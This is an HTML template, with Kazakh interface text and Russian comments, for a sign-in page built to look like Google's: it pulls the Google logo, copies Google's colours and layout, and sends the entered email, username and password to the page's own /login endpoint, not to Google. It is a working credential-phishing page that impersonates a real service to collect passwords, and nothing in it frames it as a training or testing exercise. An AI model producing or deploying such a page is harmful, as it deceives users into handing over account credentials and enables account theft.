<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Аккаунтқа кіру</title>
    <!-- Библиотека Bootstrap (по желанию можно оставить для адаптивности) -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">

    <!-- Минимальные стили, чтобы приблизить дизайн к Google -->
    <style>
        body {
            background-color: #f1f1f1;
            font-family: Arial, sans-serif;
        }
        .google-login-container {
            background: #fff;
            width: 360px;
            margin: 5% auto;
            border: 1px solid #dadce0;
            border-radius: 8px;
            padding: 40px 30px;
        }
        .google-logo {
            display: block;
            width: 75px;
            margin: 0 auto 20px;
        }
        .google-title {
            font-size: 1.25rem;
            margin-bottom: 10px;
        }
        .google-subtitle {
            font-size: 0.9rem;
            color: #202124;
            margin-bottom: 30px;
        }
        .google-input {
            width: 100%;
            margin-bottom: 15px;
        }
        .google-link {
            font-size: 0.85rem;
            color: #1a73e8;
            text-decoration: none;
        }
        .google-link:hover {
            text-decoration: underline;
        }
        .google-btn {
            width: 100%;
            margin-top: 10px;
            background-color: #1a73e8;
            border-color: #1a73e8;
        }
        .google-btn:hover {
            background-color: #1765c1;
            border-color: #1765c1;
        }
        .footer-links {
            margin-top: 20px;
            text-align: right;
        }
    </style>
</head>
<body>
    <div class="google-login-container">
        <!-- Логотип Google -->
        <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google" class="google-logo">

        <!-- Заголовок и подзаголовок -->
        <div class="google-title">Кіру</div>
        <div class="google-subtitle">Өз аккаунтыңызды пайдаланыңыз</div>

        <!-- Форма для отправки данных на /login -->
        <form method="POST" action="/login">
            <!-- Скрытое поле для передачи email (как в вашем коде) -->
            <input type="hidden" name="email" value="{{ email }}">

            <!-- Поле для имени пользователя -->
            <input
                type="text"
                name="username"
                class="form-control google-input"
                placeholder="Электрондық поштаны енгізіңіз"
                required
            >

            <!-- Поле для пароля -->
            <input
                type="password"
                name="password"
                class="form-control google-input"
                placeholder="Құпия сөзді енгізіңіз"
                required
            >

            <!-- Кнопка входа -->
            <button type="submit" class="btn btn-primary google-btn">
                Келесі
            </button>
        </form>

        <!-- Дополнительные ссылки (по желанию) -->
        <div class="footer-links">
            <a href="#" class="google-link">Эл. пошта мекенжайын ұмыттыңыз ба?</a>
            <br>
            <a href="#" class="google-link">Жаңа аккаунт ашу</a>
        </div>
    </div>
</body>
</html>
